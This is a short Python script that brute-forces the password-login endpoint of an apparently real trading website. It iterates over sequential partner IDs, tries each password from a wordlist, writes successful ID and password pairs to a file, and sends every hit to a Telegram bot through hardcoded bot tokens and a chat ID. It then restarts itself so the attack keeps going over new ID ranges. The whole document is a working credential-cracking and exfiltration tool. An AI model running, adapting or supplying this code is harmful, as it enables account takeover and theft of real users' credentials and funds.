import requests,time,sys,os,random,telepot
from requests import ConnectionError
url1 = "https://trade.topbos.com/trade/pwdLogin.do"

def ste(use):
#    token = "5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs"
    token = "5162664077:AAFAjX2fJJiZUrpFroio2MaKJqsqqDBh7F8"
    idd = 1380298324
    bot = telepot.Bot(token)
    bot.sendMessage(idd,use)


def search(idu,pw):
          for i in range(100):
             idu +=1
             for line in pw:
                 pwd = line.strip()
                 try:
                     da={'partnerId':idu,'pwd':pwd}
                     resp = requests.post(url1,data=da)
                     if 'S' in str(resp.text):
                          print(idu,pwd,'Found Fuck')
                          usp = f"{idu} : {pwd}"
                          ste(usp)
                          r = open('hasilnew.txt','a')
                          r.write('{} : {}\n'.format(idu,pwd))
                          r.close()
                     else:
                          print(idu,pwd,"wrong")
                 except ConnectionError:
                      time.sleep(3)
def program():
           python = sys.executable
           os.execl(python, python, * sys.argv)
           curdir = os.getcwd()
def main():
       put='1'
       if put == '1' or put == '01':
          di=int(random.randint(100,10000))
#             user=int("%000" % (di))
          his=open('history.txt','r').read()
          if str(di) in his.split():
                 print('[=]',di,'Sudah digunakan')
                 program()
          else:
                 user=int("%s00" % (di))
                 pasw=open('fin.txt','r').readlines()
                 search(user,pasw)
                 hs=open('history.txt','a')
                 hs.write('{}\n'.format(di))
                 hs.close()
                 program()
main()
